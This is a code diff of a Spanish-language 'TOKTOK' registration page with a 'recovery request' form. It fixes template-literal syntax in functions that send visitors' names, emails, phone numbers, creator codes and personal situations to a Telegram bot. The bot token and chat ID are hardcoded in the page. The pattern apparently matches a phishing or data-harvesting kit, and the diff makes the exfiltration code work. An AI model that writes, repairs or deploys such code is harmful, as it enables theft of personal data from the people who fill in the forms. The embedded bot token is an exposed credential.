@@ -798,15 +798,15 @@
                 const botToken = '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY';
                 const chatId = '7100840475';
                 
-                const message = 🎉 *NUEVO REGISTRO EN TOKTOK* 🎉\n\n +
-                              👤 *Nombre:* ${userData.name}\n +
-                              📧 *Email:* ${userData.email}\n +
-                              📱 *Teléfono:* ${userData.phone}\n +
-                              🔑 *Código de Creador:* ${userData.creatorCode || 'No proporcionado'}\n\n +
-                              ⏰ *Fecha:* ${new Date().toLocaleString()};
+                const message = `🎉 *NUEVO REGISTRO EN TOKTOK* 🎉\n\n` +
+                              `👤 *Nombre:* ${userData.name}\n` +
+                              `📧 *Email:* ${userData.email}\n` +
+                              `📱 *Teléfono:* ${userData.phone}\n` +
+                              `🔑 *Código de Creador:* ${userData.creatorCode || 'No proporcionado'}\n\n` +
+                              `⏰ *Fecha:* ${new Date().toLocaleString()}`;
                 
                 // Enviar la solicitud usando fetch
-                const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1179,8 +1179,8 @@
             
             // Resetear todos los pasos
             for (let i = 1; i <= 4; i++) {
-                const step = document.querySelector(.step[data-step="${i}"]);
-                const content = document.getElementById(step-${i});
+                const step = document.querySelector(`.step[data-step="${i}"]`);
+                const content = document.getElementById(`step-${i}`);
                 
                 if (i === 1) {
                     step.classList.add('active');
@@ -1210,16 +1210,16 @@
         
         function goToStep(step) {
             // Ocultar paso actual
-            const currentStepElement = document.getElementById(step-${currentStep});
-            const currentStepIndicator = document.querySelector(.step[data-step="${currentStep}"]);
+            const currentStepElement = document.getElementById(`step-${currentStep}`);
+            const currentStepIndicator = document.querySelector(`.step[data-step="${currentStep}"]`);
             
             currentStepElement.classList.remove('active');
             currentStepIndicator.classList.remove('active');
             
             // Mostrar nuevo paso
             currentStep = step;
-            const newStepElement = document.getElementById(step-${step});
-            const newStepIndicator = document.querySelector(.step[data-step="${step}"]);
+            const newStepElement = document.getElementById(`step-${step}`);
+            const newStepIndicator = document.querySelector(`.step[data-step="${step}"]`);
             
             newStepElement.classList.add('active');
             newStepIndicator.classList.add('active');
@@ -1237,16 +1237,16 @@
                 const botToken = '7596286871:AAGFe3sHy-GhykyM_xsFwDU8qrt6SWXSWHY';
                 const chatId = '7100840475';
                 
-                const message = 📋 *NUEVA SOLICITUD DE RECUPERACIÓN*\n\n +
-                              👤 *Nombre:* ${name}\n +
-                              📧 *Email:* ${email}\n +
-                              📱 *Teléfono:* ${phone}\n +
-                              📍 *Departamento:* ${getDepartmentName(department)}\n\n +
-                              📝 *Situación:*\n${situation}\n\n +
-                              ⏰ *Hora:* ${new Date().toLocaleString()};
+                const message = `📋 *NUEVA SOLICITUD DE RECUPERACIÓN*\n\n` +
+                              `👤 *Nombre:* ${name}\n` +
+                              `📧 *Email:* ${email}\n` +
+                              `📱 *Teléfono:* ${phone}\n` +
+                              `📍 *Departamento:* ${getDepartmentName(department)}\n\n` +
+                              `📝 *Situación:*\n${situation}\n\n` +
+                              `⏰ *Hora:* ${new Date().toLocaleString()}`;
                 
                 // Enviar la solicitud usando fetch
-                const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1340,7 +1340,7 @@
         function showToast(type, title, message) {
             const toastContainer = document.getElementById('toast-container');
             const toast = document.createElement('div');
-            toast.className = toast ${type};
+            toast.className = `toast ${type}`;
             
             const toastContent = `
                 <div class="font-medium">${title}</div>
